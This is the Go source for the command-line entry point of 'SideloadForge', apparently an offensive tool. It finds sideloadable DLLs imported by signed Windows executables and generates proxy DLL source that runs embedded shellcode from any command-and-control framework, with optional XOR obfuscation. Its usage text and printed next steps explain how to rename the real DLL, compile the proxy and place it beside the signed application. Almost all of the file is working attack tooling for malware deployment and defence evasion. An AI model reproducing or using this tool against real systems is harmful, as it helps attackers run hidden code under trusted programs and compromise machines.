package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/phantom-offensive/SideloadForge/internal/pe"
	"github.com/phantom-offensive/SideloadForge/internal/proxy"
)

// knownDLLs are Windows system DLLs that resolve from System32 (not good
// sideload targets). Anything NOT in this list is a candidate.
var knownDLLs = map[string]bool{
	"kernel32.dll": true, "user32.dll": true, "gdi32.dll": true, "advapi32.dll": true,
	"shell32.dll": true, "ole32.dll": true, "oleaut32.dll": true, "ws2_32.dll": true,
	"wininet.dll": true, "ntdll.dll": true, "comdlg32.dll": true, "comctl32.dll": true,
	"msvcrt.dll": true, "crypt32.dll": true, "secur32.dll": true, "userenv.dll": true,
	"version.dll": true, "winmm.dll": true, "shlwapi.dll": true, "rpcrt4.dll": true,
	"wtsapi32.dll": true, "psapi.dll": true, "dbghelp.dll": true, "imagehlp.dll": true,
	"bcrypt.dll": true, "ncrypt.dll": true, "iphlpapi.dll": true, "netapi32.dll": true,
	"dnsapi.dll": true, "mswsock.dll": true, "wldap32.dll": true, "setupapi.dll": true,
	"winhttp.dll": true, "cfgmgr32.dll": true, "powrprof.dll": true,
	"uxtheme.dll": true, "dwmapi.dll": true, "imm32.dll": true, "msimg32.dll": true,
}

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "scan":
		cmdScan(os.Args[2:])
	case "generate":
		cmdGenerate(os.Args[2:])
	case "help", "-h", "--help":
		usage()
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n", os.Args[1])
		usage()
		os.Exit(1)
	}
}

func usage() {
	fmt.Print(`SideloadForge — C2-agnostic signed-app DLL sideload generator

Usage:
  forge scan <signed.exe>                        List sideloadable DLL candidates
  forge generate <original.dll>                  Generate a proxy DLL that runs shellcode
      --shellcode payload.bin                    Raw shellcode from any C2 (required)
      --rename version_orig                      Renamed module base (default: <name>_orig)
      --out outdir                               Output directory (default: .)
      --arch x64|x86                             Target arch (default: x64)
      --xor                                      XOR-encode the embedded shellcode

Example:
  forge scan C:\Path\app.exe
  forge generate version.dll --shellcode beacon.bin --out payload
`)
}

func cmdScan(args []string) {
	if len(args) < 1 {
		fmt.Fprintln(os.Stderr, "usage: forge scan <signed.exe>")
		os.Exit(1)
	}
	target := args[0]

	libs, err := pe.ImportedLibraries(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Imports for %s\n\n", target)
	fmt.Println("Sideload candidates (non-system DLLs):")
	found := false
	for _, l := range libs {
		if knownDLLs[l] {
			continue
		}
		found = true
		fmt.Printf("  [*] %s\n", l)
	}
	if !found {
		fmt.Println("  (none — all imports are system DLLs)")
	}
	fmt.Println("\nAll imports:")
	for _, l := range libs {
		mark := " "
		if !knownDLLs[l] {
			mark = "!"
		}
		fmt.Printf("  %s %s\n", mark, l)
	}
}

func cmdGenerate(args []string) {
	// Split the first positional (original DLL) from the flags, so flags can
	// appear after the positional argument.
	var dllPath string
	var flagArgs []string
	for _, a := range args {
		if dllPath == "" && !strings.HasPrefix(a, "-") {
			dllPath = a
		} else {
			flagArgs = append(flagArgs, a)
		}
	}

	fs := flag.NewFlagSet("generate", flag.ExitOnError)
	shellcode := fs.String("shellcode", "", "raw shellcode file (any C2)")
	rename := fs.String("rename", "", "renamed module base (default <name>_orig)")
	out := fs.String("out", ".", "output directory")
	arch := fs.String("arch", "x64", "target arch: x64 or x86")
	xor := fs.Bool("xor", false, "XOR-encode the embedded shellcode with a random key")
	fs.Parse(flagArgs)

	if dllPath == "" {
		fmt.Fprintln(os.Stderr, "usage: forge generate <original.dll> --shellcode payload.bin [--out dir]")
		os.Exit(1)
	}
	if *shellcode == "" {
		fmt.Fprintln(os.Stderr, "error: --shellcode is required")
		os.Exit(1)
	}

	sc, err := os.ReadFile(*shellcode)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error reading shellcode: %v\n", err)
		os.Exit(1)
	}

	cfg := proxy.Config{
		OriginalDLL: dllPath,
		Shellcode:   sc,
		OutDir:      *out,
		RenameBase:  *rename,
		Arch:        *arch,
		XOR:         *xor,
	}

	files, err := proxy.Generate(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}

	base := strings.TrimSuffix(filepath.Base(dllPath), filepath.Ext(dllPath))
	fmt.Println("Generated proxy DLL source:")
	for _, f := range files {
		fmt.Printf("  %s\n", f)
	}
	fmt.Println("\nNext steps:")
	fmt.Printf("  1. Rename the real %[1]s.dll to %[2]s.dll\n", base, base+"_orig")
	fmt.Printf("  2. Run build.bat (or: x86_64-w64-mingw32-gcc -shared -o %[1]s.dll proxy.c %[1]s.def)\n", base)
	fmt.Printf("  3. Drop the new %[1]s.dll next to the signed app\n", base)
}
